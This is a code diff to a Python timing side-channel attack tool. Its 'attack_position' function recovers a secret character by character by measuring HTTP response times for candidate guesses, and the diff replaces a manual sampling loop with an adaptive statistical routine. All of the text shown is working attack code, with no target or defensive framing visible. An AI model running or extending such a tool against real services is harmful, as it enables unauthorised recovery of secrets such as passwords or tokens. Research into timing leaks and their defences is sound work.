@@ -13,6 +13,7 @@ import requests
 
 from measure import measure_timing
 from stats_engine import (
+    adaptive_distinguish,
     compare_top_two,
     confidence_interval,
     rank_candidates,
@@ -83,31 +84,35 @@ def attack_position(
         if verbose:
             print(f"  Inconclusive (p={p_value:.4f}), collecting more samples...")
 
-        while not conclusive:
-            total_top = len(candidate_samples[top_char])
-            total_second = len(candidate_samples[second_char])
-            if total_top >= max_samples and total_second >= max_samples:
-                break
-
-            batch = min(100, max_samples - total_top)
-            if batch <= 0:
-                break
-
-            for char in [top_char, second_char]:
+        def collect_for(char: str):
+            def collect(n: int) -> np.ndarray:
                 guess = build_guess(prefix, char, secret_length)
-                extra = measure_timing(
-                    base_url, endpoint, guess, samples=batch, warmup=0, session=session
-                )
-                candidate_samples[char] = np.concatenate(
-                    [candidate_samples[char], extra]
+                return measure_timing(
+                    base_url, endpoint, guess, samples=n, warmup=0, session=session
                 )
 
-            ranked = rank_candidates(candidate_samples)
-            winner, p_value, conclusive = compare_top_two(
-                ranked, candidate_samples, p_threshold
-            )
-            if verbose:
-                print(f"    samples={len(candidate_samples[top_char])}, p={p_value:.4f}")
+            return collect
+
+        final_top, final_second, p_value, conclusive = adaptive_distinguish(
+            candidate_samples[top_char],
+            candidate_samples[second_char],
+            collect_for(top_char),
+            collect_for(second_char),
+            initial_samples=samples,
+            max_samples=max_samples,
+            p_threshold=p_threshold,
+            batch_size=100,
+        )
+        candidate_samples[top_char] = final_top
+        candidate_samples[second_char] = final_second
+        ranked = rank_candidates(candidate_samples)
+        winner, p_value, conclusive = compare_top_two(
+            ranked, candidate_samples, p_threshold
+        )
+
+        if verbose:
+            status = 'conclusive' if conclusive else 'cap reached'
+            print(f"    adaptive done: samples={len(final_top)}, p={p_value:.4f} [{status}]")
 
     top_mean = trimmed_mean(candidate_samples[winner]) if winner else 0.0
     top_std = std_dev(candidate_samples[winner]) if winner else 0.0
